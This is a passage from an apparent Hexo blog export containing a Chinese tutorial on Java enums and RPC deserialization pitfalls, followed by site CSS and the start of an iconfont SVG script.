class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### ✅源码分析</span><br><span class="line"></span><br><span class="line">- 观察 `java.lang`包下的`Enum`源代码其中定义的两个属性，及同名函数</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    public abstract class Enum&lt;E extends Enum&lt;E&gt;&gt; implements Comparable&lt;E&gt;, Serializable &#123;</span><br><span class="line">    </span><br><span class="line">        private final String name;</span><br><span class="line">    </span><br><span class="line">        public final String name() &#123;</span><br><span class="line">            return name;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        private final int ordinal;</span><br><span class="line">    </span><br><span class="line">        public final int ordinal() &#123;</span><br><span class="line">            return ordinal;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        protected Enum(String name, int ordinal) &#123;</span><br><span class="line">            this.name = name;</span><br><span class="line">            this.ordinal = ordinal;</span><br><span class="line">        &#125;</span><br><span class="line">        ...  // omit some content</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><font color="Orange">*从源码中可知 Enum的构造函数为 **protected** 级别，再从[反编译](#mime)的照片观察到 SeasonEnum内部声明的四个实例，发现并未显式调用Enum父类的构造函数，甚至连SeasonEnum自身的构造函数也没有显式调用。由此可知，枚举类内部定义的多个实例，其构造过程是由编译器调用构造函数来处理完成的。从Enum构造函数的注释，也可以佐证这一点*</font> </li><li><img src="枚举.assets/enum构造方法的注释说明.png" alt="enum构造方法的注释说明"></li></ul></li></ul><h4 id="⭐枚举中的方法"><a href="#⭐枚举中的方法" class="headerlink" title="⭐枚举中的方法"></a>⭐枚举中的方法</h4><h5 id="✅方法汇总"><a href="#✅方法汇总" class="headerlink" title="✅方法汇总"></a>✅方法汇总</h5><ul><li><p>java.lang.Enum中的方法</p><ul><li><img src="枚举.assets/Enum中的方法.png" alt="Enum中的方法"></li></ul></li><li><p>SeasonEnum中的方法</p><ul><li>| 返回值       | 方法     | 描述                         |<br>| —————— | ———— | —————————————— |<br>| SeasonEnum[] | values() | 返回一个此枚举所有实例的数组 |</li></ul></li></ul><h5 id="✅name-和toString"><a href="#✅name-和toString" class="headerlink" title="✅name()和toString()"></a>✅name()和toString()</h5><ul><li>name()<ul><li>根据枚举值来获取该枚举成员的变量名。</li></ul></li><li>toString()<ul><li>返回枚举值的变量名。</li></ul></li><li>相同点<ul><li>作用相同，均可获取枚举成员的变量名</li></ul></li><li>不同点<ul><li>调用时的参数不同</li><li>name方法是用final修饰的不能被重写，而toString是可以被重写的</li></ul></li></ul><h5 id="✅ordinal"><a href="#✅ordinal" class="headerlink" title="✅ordinal()"></a>✅ordinal()</h5><ul><li><p>该方法作用是，返回定义的枚举值的顺序，从0开始计数。</p></li><li><p>ordinal()方法是被设计用于基于枚举的复杂数据结构，例如EnumSet和EnumMap 。 </p></li><li><p>如果修改了枚举值定义的顺序，就会导致枚举值<code>ordinal()</code>的返回值发生变化</p><ul><li><p>所以一般枚举的做法就是在枚举内增加成员变量，再通过枚举值来自定义顺序，如本文使用的<code>SeasonEnum</code>枚举</p></li><li><p>```java<br>SPRING(“1”,”春天”),<br>SUMMER(“2”,”夏天”),<br>AUTUMN(“3”,”秋天”),<br>WINTER(“4”,”冬天”);</p><p>// 自定义顺序<br>@Getter<br>private String index;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### ✅valueOf()</span><br><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  // 上述反编译后的SeasonEnum枚举的valueOf()方法</span><br><span class="line">  public static SeasonEnum valueOf(String name) &#123;</span><br><span class="line">      return Enum.valueOf(SeasonEnum.class, name);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // Enum源码中的valueOf()方法</span><br><span class="line">  public static &lt;T extends Enum&lt;T&gt;&gt; T valueOf(Class&lt;T&gt; enumType, String name) &#123;</span><br><span class="line">      T result = enumType.enumConstantDirectory().get(name);</span><br><span class="line">      if (result != null)</span><br><span class="line">          return result;</span><br><span class="line">      if (name == null)</span><br><span class="line">          throw new NullPointerException(&quot;Name is null&quot;);</span><br><span class="line">      throw new IllegalArgumentException(</span><br><span class="line">          &quot;No enum constant &quot; + enumType.getCanonicalName() + &quot;.&quot; + name);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><font color="Orange">*比较反编译生成的 valueOf 函数和Enum 源码中的 valueOf 函数，可以发现，编译器生成的 valueOf 函数内部调用的其实就是父类 Enum中定义的 valueOf 函数。*</font> </li><li><p>而父类 Enum中定义的 valueOf 函数，其实调用的是 Class 类中定义的 enumConstantDirectory 函数，在该函数内对参数 enumType 是否为枚举类型进行判断</p><ul><li>当传入null时，抛出<code>NullPointerException</code>异常<ul><li><img src="枚举.assets/NullPointerException异常.png" alt="NullPointerException异常"></li></ul></li><li>当传入不存在的枚举值时，抛出<span id="IllegalArgumentException">IllegalArgumentException</span>异常<ul><li><img src="枚举.assets/IllegalArgumentException异常.png" alt="IllegalArgumentException异常"></li></ul></li><li>当传入存在的枚举值时，返回枚举实例名称和枚举实例构成的 map 对象<ul><li><img src="枚举.assets/valueof传入正常枚举值.png" alt="valueof传入正常枚举值"></li></ul></li></ul></li></ul><h5 id="✅values"><a href="#✅values" class="headerlink" title="✅values()"></a>✅values()</h5><ul><li><p>该方法在<code>java.lang.Enum</code>中不存在</p></li><li><p>观察反编译生成的 values 函数，返回的是枚举类内部声明的实例数组的 clone 对象，即返回一个所有枚举值的数组</p><ul><li><p>```java<br>public static SeasonEnum[] values() {</p><pre><code>return $VALUES.clone();</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">##### ✅compareTo()</span><br><span class="line"></span><br><span class="line">- 该方法用来比较两个枚举值的`ordinal`值，即枚举值的定义序号</span><br><span class="line"></span><br><span class="line">- 观察Enum源码， Enum实现了Comparable接口，而 Comparable 接口中只有一个函数声明，即Enum重写compareTo函数。可以看到，先判断是不是同一个枚举类的变量，再返回当前枚举值和传递的枚举值差值。</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    public final int compareTo(E o) &#123;</span><br><span class="line">        Enum&lt;?&gt; other = (Enum&lt;?&gt;)o;</span><br><span class="line">        Enum&lt;E&gt; self = this;</span><br><span class="line">        if (self.getClass() != other.getClass() &amp;&amp; // optimization</span><br><span class="line">            self.getDeclaringClass() != other.getDeclaringClass())</span><br><span class="line">            throw new ClassCastException();</span><br><span class="line">        return self.ordinal - other.ordinal;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>```java<br>Season summer = Season.valueOf(“SUMMER”);<br>for(Season s : Season.values()){</p><pre><code>System.out.print(summer.name()+&quot; compare to &quot;+s.name());System.out.println(&quot; result: &quot;+summer.compareTo(s));</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  // 返回正数表示当前对象较大，0 表示大小相等，负数表示当前对象较小，差值表示声明顺序的差距大小。</span><br><span class="line">  SUMMER compare to SPRING result: 1</span><br><span class="line">  SUMMER compare to SUMMER result: 0</span><br><span class="line">  SUMMER compare to AUTUMN result: -1</span><br><span class="line">  SUMMER compare to WINTER result: -2</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="⭐业务场景举例"><a href="#⭐业务场景举例" class="headerlink" title="⭐业务场景举例"></a>⭐业务场景举例</h4><blockquote><ul><li><strong>星期：</strong> Monday（星期一）、Tuesday（星期二）、Wednesday（星期三）、Thursday（星期四）、Firday（星期五）、Saturday（星期六）、Sunday（星期日）</li><li><strong>性别：</strong> Man（男）、Woman（女）</li><li><strong>季节：</strong> Spring（春天）、Summer（夏天）、Autumn（秋天）、Winter（冬天）</li><li><strong>支付方式：</strong> Cash（现金）、WeChatPay（微信）、Alipay（支付宝）、BankCard（银行卡）、CreditCard（信用卡）</li><li><strong>订单状态：</strong> Nonpayment（未付款）、Paid（已付款）、Fulfilled（已配货）、Delivered（已发货）、Return（退货）、Checked（已确认）</li><li><strong>线程状态：</strong> Establish（创建）、Ready（就绪）、Run（运行）、Obstruct（阻塞）、Die（死亡）</li></ul></blockquote><h4 id="⭐注意事项"><a href="#⭐注意事项" class="headerlink" title="⭐注意事项"></a>⭐注意事项</h4><h5 id="✅阿里巴巴开发手册关于枚举建议（1-4-0）"><a href="#✅阿里巴巴开发手册关于枚举建议（1-4-0）" class="headerlink" title="✅阿里巴巴开发手册关于枚举建议（1.4.0）"></a>✅阿里巴巴开发手册关于枚举建议（1.4.0）</h5><ul><li><img src="枚举.assets/阿里巴巴开发手册-枚举3.png" alt="阿里巴巴开发手册-枚举3"></li></ul><h5 id="✅二方库释义"><a href="#✅二方库释义" class="headerlink" title="✅二方库释义"></a>✅二方库释义</h5><blockquote><p>一方库指的是本项目中的依赖</p><p>二方库指的是公司内部其他项目提供的依赖</p><p>三方库指的是其他组织、公司等来自第三方的依赖</p></blockquote><h5 id="✅为什么不建议接口的返回值包含枚举类型呢？"><a href="#✅为什么不建议接口的返回值包含枚举类型呢？" class="headerlink" title="✅为什么不建议接口的返回值包含枚举类型呢？"></a>✅为什么不建议接口的返回值包含枚举类型呢？</h5><ul><li><p>假设有一个二方库，A系统和B系统都依赖了该二方库，同时B系统通过RPC远程调用A系统的一个接口（该接口中返回值中有一个参数类型是枚举类型）</p><ul><li><p>```java<br>// 二方库中的枚举<br>public enum AType{</p><pre><code>P_T,A_B</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  // A系统</span><br><span class="line">  public interface AService &#123;</span><br><span class="line">      public AResponse doSth(ARequest aRequest);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  public Class AResponse&#123;</span><br><span class="line">      private Boolean success;</span><br><span class="line">      // 返回值包括了枚举</span><br><span class="line">      private AType aType;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li><li><p>```java<br>// B系统<br>public class BService {</p><pre><code>@AutowiredAService aService;public void doSth()&#123;    ARequest aRequest = new ARequest();    AResponse aResponse = aService.doSth(aRequest);    AType aType = aResponse.getAType();&#125;</code></pre><p>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">- 当两个使用同一个枚举的时候是不会出现问题的，即在原来的二方库上可以继续使用。但在某天，二方库中的枚举进行了升级，A系统也跟着升级，而B系统并没有跟着升级，即</span><br><span class="line"></span><br><span class="line">  - ```java</span><br><span class="line">    // 二方库中的枚举，也是A系统的枚举</span><br><span class="line">    public enum AType&#123;</span><br><span class="line">        P_T,</span><br><span class="line">        A_B,</span><br><span class="line">        P_M</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // B系统的枚举</span><br><span class="line">    public enum AType&#123;</span><br><span class="line">        P_T,</span><br><span class="line">        A_B,</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><font color="Orange">*这种情况下，在B系统通过RPC调用A系统的时候，如果A系统返回的AResponse中的aType的类型为新增的P_M时候，B系统就会无法解析。一般在这种时候，RPC框架就会发生反序列化异常。导致程序被中断。*</font> </li></ul><h5 id="✅RPC反序列化枚举异常分析"><a href="#✅RPC反序列化枚举异常分析" class="headerlink" title="✅RPC反序列化枚举异常分析"></a>✅RPC反序列化枚举异常分析</h5><ul><li>RPC框架大多数会采用JSON的格式进行数据传输，也就是客户端会将返回值序列化成JSON字符串，而服务端会再将JSON字符串反序列化成一个Java对象。</li><li>而JSON在反序列化的过程中，对于一个枚举类型，会尝试调用对应的枚举类的valueOf方法来获取到对应的枚举。</li><li>如果从枚举类中找不到对应的枚举项的时候，就会抛出<a href="#IllegalArgumentException">IllegalArgumentException</a>，这也是为什么阿里巴巴不推荐在接口的返回值中包含二方库枚举的原因</li></ul><h4 id="⭐小结"><a href="#⭐小结" class="headerlink" title="⭐小结"></a>⭐小结</h4><ul><li><p>总的来说，枚举在代码设计可以体现为，语义化地代表词典并作为一个独立的引用类型存在。</p></li><li><p>如果担心枚举使用不当，可以使用字符串常量来代表字典，这个是最常见的一刀切方式。例如上述中RPC反序列化异常的问题，如果使用字符串代替RPC接口中的枚举，那么B系统只需要传递字符串就行，至于传递的值的合法性，只需要在A系统内进行校验就可以了。</p></li><li>但是笔者觉得这种投鼠忌器的方式不太好，尽管枚举可能会带来扩展兼容性的问题，我们应当做的是避免出现扩展兼容性的问题（即按照阿里巴巴推荐方式）。对于单体项目或者需要快速迭代的项目，枚举便利性收益是大于兼容性的。</li></ul><h3 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h3><ul><li><a href="https://developer.aliyun.com/article/665108">Java枚举类型enum - 阿里云开发者社区</a></li><li><a href="https://www.bilibili.com/video/BV1A34y1v7aL?spm_id_from=333.337.search-card.all.click">都有常量了，为啥还要用枚举？ - 哔哩哔哩</a></li><li><a href="https://blog.51cto.com/u_11440114/5102212">一文看懂Java的枚举 - 51CTO博客</a></li><li><a href="https://developer.aliyun.com/special/tech-java">Java开发手册 - 阿里云开发者社区</a></li><li><a href="https://mp.weixin.qq.com/s/LJuE9cH2FrwN6-1qEud6LA">求你了，不要再在对外接口中使用枚举类型了！- Hollis - 公众号</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> categories3 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tags3 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>about</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<p style="font-size: 25px;">关于我</p><div class="table-container"><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>英文名:</td><td>Ethan</td></tr><tr><td>职业:</td><td>程序员</td></tr><tr><td>运动:</td><td>跑步、音乐、游戏</td></tr></tbody></table></div>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {  font-family: ZhuZiAYuanJWD;  src: url(https://npm.elemecdn.com/anzhiyu-blog@1.1.6/fonts/ZhuZiAWan.woff2);  font-display: swap;  font-weight: lighter;}div#menus {  font-family: "ZhuZiAYuanJWD";}h1#site-title {  font-family: ZhuZiAYuanJWD;  font-size: 3em !important;}a.article-title,a.blog-slider__title,a.categoryBar-list-link,h1.post-title {  font-family: ZhuZiAYuanJWD;}.iconfont {  font-family: "iconfont" !important;  font-size: 3em;  /* 可以定义图标大小 */  font-style: normal;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;}/* 时间轴生肖icon */svg.icon {  /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */  width: 1em;  height: 1em;  /* width和height定义图标的默认宽度和高度*/  vertical-align: -0.15em;  fill: currentColor;  overflow: hidden;}.icon-zhongbiao::before {  color: #f7c768;}/* bilibli番剧插件 */#article-container .bangumi-tab.bangumi-active {  background: var(--anzhiyu-theme);  color: var(--anzhiyu-ahoverbg);  border-radius: 10px;}a.bangumi-tab:hover {  text-decoration: none !important;}.bangumi-button:hover {  background: var(--anzhiyu-theme) !important;  border-radius: 10px !important;  color: var(--anzhiyu-ahoverbg) !important;}a.bangumi-button.bangumi-nextpage:hover {  text-decoration: none !important;}.bangumi-button {  padding: 5px 10px !important;}a.bangumi-tab {  padding: 5px 10px !important;}svg.icon.faa-tada {  font-size: 1.1em;}.bangumi-info-item {  border-right: 1px solid #f2b94b;}.bangumi-info-item span {  color: #f2b94b;}.bangumi-info-item em {  color: #f2b94b;}/* 解决artitalk的图标问题 */#uploadSource > svg {  width: 1.19em;  height: 1.5em;}/*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */#page-header:not(.not-top-img):before {  background-color: transparent !important;}/* 首页文章卡片 */#recent-posts > .recent-post-item {  background: rgba(255, 255, 255, 0.9);}/* 首页侧栏卡片 */#aside-content .card-widget {  background: rgba(255, 255, 255, 0.9);}/* 文章页面正文背景 */div#post {  background: rgba(255, 255, 255, 0.9);}/* 分页页面 */div#page {  background: rgba(255, 255, 255, 0.9);}/* 归档页面 */div#archive {  background: rgba(255, 255, 255, 0.9);}/* 标签页面 */div#tag {  background: rgba(255, 255, 255, 0.9);}/* 分类页面 */div#category {  background: rgba(255, 255, 255, 0.9);}/*夜间模式伪类遮罩层透明*/[data-theme="dark"] #recent-posts > .recent-post-item {  background: #121212;}[data-theme="dark"] .card-widget {  background: #121212 !important;}[data-theme="dark"] div#post {  background: #121212 !important;}[data-theme="dark"] div#tag {  background: #121212 !important;}[data-theme="dark"] div#archive {  background: #121212 !important;}[data-theme="dark"] div#page {  background: #121212 !important;}[data-theme="dark"] div#category {  background: #121212 !important;}[data-theme="dark"] div#category {  background: transparent !important;}/* 页脚透明 */#footer {  background: transparent !important;}/* 头图透明 */#page-header {  background: transparent !important;}#rightside > div > button {  border-radius: 5px;}/* 滚动条 */::-webkit-scrollbar {  width: 10px;  height: 10px;}::-webkit-scrollbar-thumb {  background-color: #3b70fc;  border-radius: 2em;}::-webkit-scrollbar-corner {  background-color: transparent;}::-moz-selection {  color: #fff;  background-color: #3b70fc;}/* 音乐播放器 *//* .aplayer .aplayer-lrc {  display: none !important;} */.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {  left: -66px !important;  transition: all 0.3s;  /* 默认情况下缩进左侧66px，只留一点箭头部分 */}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {  left: 0 !important;  transition: all 0.3s;  /* 鼠标悬停是左侧缩进归零，完全显示按钮 */}.aplayer.aplayer-fixed {  z-index: 999999 !important;}/* 评论框  */.vwrap {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 30px 0px;}/* 设置评论框 */.vcard {  box-shadow: 2px 2px 5px #bbb;  background: rgba(255, 255, 255, 0.3);  border-radius: 8px;  padding: 30px;  margin: 30px 0px 0px 0px;}/* 鼠标图标 */body {  cursor: url("/img/x1.cur"), auto;}a,[type="button"]:not(:disabled),[type="reset"]:not(:disabled),[type="submit"]:not(:disabled),button:not(:disabled) {  cursor: url("/img/x2.cur"), auto !important;}/* md网站下划线 */#article-container a:hover {  text-decoration: none !important;}#article-container #hpp_talk p img {  display: inline;}/* 404页面 */#error-wrap {  position: absolute;  top: 40%;  right: 0;  left: 0;  margin: 0 auto;  padding: 0 1rem;  max-width: 1000px;  transform: translate(0, -50%);}#error-wrap .error-content {  display: flex;  flex-direction: row;  justify-content: center;  align-items: center;  margin: 0 1rem;  height: 18rem;  border-radius: 8px;  background: var(--card-bg);  box-shadow: var(--card-box-shadow);  transition: all 0.3s;}#error-wrap .error-content .error-img {  box-flex: 1;  flex: 1;  height: 100%;  border-top-left-radius: 8px;  border-bottom-left-radius: 8px;  background-color: #3b70fc;  background-position: center;  background-size: cover;}#error-wrap .error-content .error-info {  box-flex: 1;  flex: 1;  padding: 0.5rem;  text-align: center;  font-size: 14px;  font-family: Titillium Web, "PingFang SC", "Hiragino Sans GB", "Microsoft JhengHei", "Microsoft YaHei", sans-serif;}#error-wrap .error-content .error-info .error_title {  margin-top: -4rem;  font-size: 9em;}#error-wrap .error-content .error-info .error_subtitle {  margin-top: -3.5rem;  word-break: break-word;  font-size: 1.6em;}#error-wrap .error-content .error-info a {  display: inline-block;  margin-top: 0.5rem;  padding: 0.3rem 1.5rem;  background: var(--btn-bg);  color: var(--btn-color);}#body-wrap.error .aside-list {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  bottom: 0px;  position: absolute;  padding: 1rem;  width: 100%;  overflow: scroll;}#body-wrap.error .aside-list .aside-list-group {  display: flex;  flex-direction: row;  flex-wrap: nowrap;  max-width: 1200px;  margin: 0 auto;}#body-wrap.error .aside-list .aside-list-item {  padding: 0.5rem;}#body-wrap.error .aside-list .aside-list-item img {  width: 100%;  object-fit: cover;  border-radius: 12px;}#body-wrap.error .aside-list .aside-list-item .thumbnail {  overflow: hidden;  width: 230px;  height: 143px;  background: var(--anzhiyu-card-bg);  display: flex;}#body-wrap.error .aside-list .aside-list-item .content .title {  -webkit-line-clamp: 2;  overflow: hidden;  display: -webkit-box;  -webkit-box-orient: vertical;  line-height: 1.5;  justify-content: center;  align-items: flex-end;  align-content: center;  padding-top: 0.5rem;  color: white;}#body-wrap.error .aside-list .aside-list-item .content time {  display: none;}/* 代码框主题 */#article-container figure.highlight {  border-radius: 10px;}/* 侧边栏个人信息卡片动态渐变色 */#aside-content > .card-widget.card-info {  background: linear-gradient(          -45deg,          #e8d8b9,          #eccec5,          #a3e9eb,          #bdbdf0,          #eec1ea  );  box-shadow: 0 0 5px rgb(66, 68, 68);  position: relative;  background-size: 400% 400%;  -webkit-animation: Gradient 10s ease infinite;  -moz-animation: Gradient 10s ease infinite;  animation: Gradient 10s ease infinite !important;}@-webkit-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@-moz-keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}@keyframes Gradient {  0% {    background-position: 0% 50%;  }  50% {    background-position: 100% 50%;  }  100% {    background-position: 0% 50%;  }}/* 黑夜模式适配 */[data-theme="dark"] #aside-content > .card-widget.card-info {  background: #191919ee;}/* 个人信息Follow me按钮 */#aside-content > .card-widget.card-info > #card-info-btn {  background-color: #3eb8be;  border-radius: 8px;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/universe.css"/>
      <url>/css/universe.css</url>
      
        <content type="html"><![CDATA[/* 背景宇宙星光  */#universe{    display: block;    position: fixed;    margin: 0;    padding: 0;    border: 0;    outline: 0;    left: 0;    top: 0;    width: 100%;    height: 100%;    pointer-events: none;    /* 这个是调置顶的优先级的，-1在文章页下面，背景上面，个人推荐这种 */    z-index: -1;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/ali_font.js"/>
      <url>/js/ali_font.js</url>
      
        <content type="html"><![CDATA[!(function (c) {  var l,    h,    a,    t,    i,    v =      '<svg><symbol id="icon-dragon_chen" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#D6B196" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-498.122105 265.620211L431.157895 754.526316V485.052632h-66.074948c-14.470737 110.645895-44.355368 197.066105-102.696421 260.742736l-39.747368-36.432842C306.526316 617.876211 323.368421 462.901895 323.368421 242.526316V215.578947h377.263158v53.894737H377.182316c-0.404211 58.260211-2.209684 112.128-6.359579 161.684211H700.631579v53.894737h-122.152421a481.172211 481.172211 0 0 0 76.826947 119.70021l66.479158-39.855158 27.728842 46.214737-54.460631 32.687158c29.507368 24.953263 63.757474 45.675789 102.80421 58.098526l-16.303158 51.361684c-134.224842-42.711579-222.773895-167.073684-261.551158-268.207157H485.052632v221.857684l68.985263-41.391158 27.728842 46.214737-109.783579 65.886316zM646.736842 377.263158h-215.578947v-53.894737h215.578947v53.894737z" fill="#231F20" ></path></symbol><symbol id="icon-dog_xu" viewBox="0 0 1024 1024"><path d="M512 512m-296.421053 0a296.421053 296.421053 0 1 0 592.842106 0 296.421053 296.421053 0 1 0-592.842106 0Z" fill="#D6B196" ></path><path d="M970.105263 512c0 224.983579-163.166316 412.186947-377.263158 450.533053v-54.460632C777.135158 870.507789 916.210526 707.206737 916.210526 512c0-222.881684-181.328842-404.210526-404.210526-404.210526S107.789474 289.118316 107.789474 512s181.328842 404.210526 404.210526 404.210526c9.081263 0 18.000842-0.754526 26.947368-1.374315v53.894736c-8.973474 0.538947-17.866105 1.374316-26.947368 1.374316-252.604632 0-458.105263-205.500632-458.105263-458.105263S259.395368 53.894737 512 53.894737s458.105263 205.500632 458.105263 458.105263z m-375.592421 150.393263c33.684211 44.544 75.210105 74.698105 124.739369 90.812632l11.425684 3.718737 10.401684-6.009264C781.204211 727.740632 808.421053 622.565053 808.421053 592.842105h-53.894737c0 22.069895-19.132632 80.869053-33.711158 103.504842-34.816-14.605474-64.538947-39.262316-89.249684-74.13221 48.316632-55.269053 92.079158-117.328842 120.535579-179.900632l-49.044211-22.285473c-23.767579 52.250947-59.742316 104.717474-100.055579 152.656842-24.010105-50.930526-41.148632-115.927579-51.658105-195.395369H700.631579v-53.894737h-155.189895A1848.050526 1848.050526 0 0 1 538.947368 161.684211h-53.894736c0 58.206316 2.155789 112.074105 6.494315 161.68421H323.368421v26.947368c0 216.549053-13.177263 263.545263-100.702316 359.046737l39.747369 36.432842c63.326316-69.093053 92.806737-118.272 105.714526-206.848H485.052632v-53.894736h-111.319579a1742.147368 1742.147368 0 0 0 3.449263-107.789474h120.158316c12.611368 98.250105 35.031579 177.475368 67.395368 238.187789-61.978947 65.536-128.053895 117.975579-173.298526 142.282106l25.519158 47.481263c47.589053-25.573053 114.095158-77.446737 177.55621-142.821053z m125.170526-411.971368l-80.842105-80.842106-38.103579 38.103579 80.842105 80.842106 38.103579-38.103579z" fill="#231F20" ></path></symbol><symbol id="icon-dog" viewBox="0 0 1024 1024"><path d="M894.814316 904.434526l83.240421-183.134315-13.824-13.204211c-0.485053-0.458105-45.648842-47.589053-47.939369-185.263158-0.134737-7.922526-0.134737-33.953684-0.134736-55.996631-30.693053 15.306105-70.090105 19.887158-106.09179 19.887157-92.752842 0-163.624421-23.983158-210.647579-71.275789a192.512 192.512 0 0 1-27.944421-36.513684H377.263158v377.263158c342.662737 0 403.105684 51.092211 494.592 128.377263 7.922526 6.682947 15.521684 13.312 22.959158 19.86021z" fill="#85C3DE" ></path><path d="M326.063158 282.947368c0 34.250105-13.231158 44.463158-29.642105 44.463158s-29.642105-10.213053-29.642106-44.463158c0-34.223158 13.231158-44.463158 29.642106-44.463157s29.642105 10.24 29.642105 44.463157zM269.473684 430.295579v311.646316L190.275368 916.210526h59.203369L323.368421 753.637053V377.263158h-26.947368c-119.403789 0-172.732632-53.382737-185.505685-107.789474h35.624421c51.092211 0 68.581053-15.764211 120.535579-62.544842 12.773053-11.506526 28.079158-25.276632 47.023158-41.741474l18.351158-15.952842-69.658947-99.139368-44.085895 30.989474 41.768421 59.472842c-11.183158 